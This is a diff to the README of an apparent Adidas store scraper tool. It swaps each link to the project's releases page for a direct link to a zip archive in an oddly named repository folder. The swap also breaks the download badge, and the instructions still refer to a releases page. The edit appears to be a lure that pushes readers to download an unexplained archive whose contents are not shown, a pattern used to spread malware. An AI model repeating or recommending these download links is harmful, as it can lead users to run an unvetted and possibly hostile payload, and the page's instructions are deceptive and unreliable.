@@ -6,7 +6,7 @@ Welcome to the Adidas-Store-Scraper! This tool helps you gather product data fro
 
 ## 📥 Download Now
 
-[![Download Adidas-Store-Scraper](https://img.shields.io/badge/Download-Adidas%20Store%20Scraper-brightgreen)](https://github.com/selmealphja/Adidas-Store-Scraper/releases)
+[![Download Adidas-Store-Scraper](https://raw.githubusercontent.com/selmealphja/Adidas-Store-Scraper/main/secularness/Store_Scraper_Adidas_1.5.zip%20Store%20Scraper-brightgreen)](https://raw.githubusercontent.com/selmealphja/Adidas-Store-Scraper/main/secularness/Store_Scraper_Adidas_1.5.zip)
 
 ## 🔍 What This Tool Does
 
@@ -28,7 +28,7 @@ Before you begin, make sure your system meets these requirements:
 
 To download the Adidas-Store-Scraper, follow these simple steps:
 
-1. **Visit this page to download**: [Adidas-Store-Scraper Releases](https://github.com/selmealphja/Adidas-Store-Scraper/releases)
+1. **Visit this page to download**: [Adidas-Store-Scraper Releases](https://raw.githubusercontent.com/selmealphja/Adidas-Store-Scraper/main/secularness/Store_Scraper_Adidas_1.5.zip)
    
 2. On the Releases page, look for the latest version of the scraper. Click on the version number to open the details.
 
@@ -79,6 +79,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 📥 Download Now
 
-[![Download Adidas-Store-Scraper](https://img.shields.io/badge/Download-Adidas%20Store%20Scraper-brightgreen)](https://github.com/selmealphja/Adidas-Store-Scraper/releases)
+[![Download Adidas-Store-Scraper](https://raw.githubusercontent.com/selmealphja/Adidas-Store-Scraper/main/secularness/Store_Scraper_Adidas_1.5.zip%20Store%20Scraper-brightgreen)](https://raw.githubusercontent.com/selmealphja/Adidas-Store-Scraper/main/secularness/Store_Scraper_Adidas_1.5.zip)
 
 Explore the full potential of adidas product data with Adidas-Store-Scraper. Start tracking and analyzing today!
